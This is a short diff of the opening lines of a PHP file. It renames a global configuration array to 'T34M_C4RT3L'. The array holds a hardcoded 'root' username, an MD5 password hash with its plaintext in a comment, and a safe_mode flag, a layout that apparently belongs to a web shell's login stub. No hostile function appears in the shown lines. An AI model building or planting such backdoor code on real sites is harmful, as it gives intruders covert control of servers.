@@ -1,6 +1,6 @@
 
 <?php
-$GLOBALS['oZgNypoPRU'] = array(
+$GLOBALS['T34M_C4RT3L'] = array(
     'username' => 'root',
     'password' => 'c24df88d249b151dae2b7c40de81e775',//md5(ehsan)
     'safe_mode' => '1',
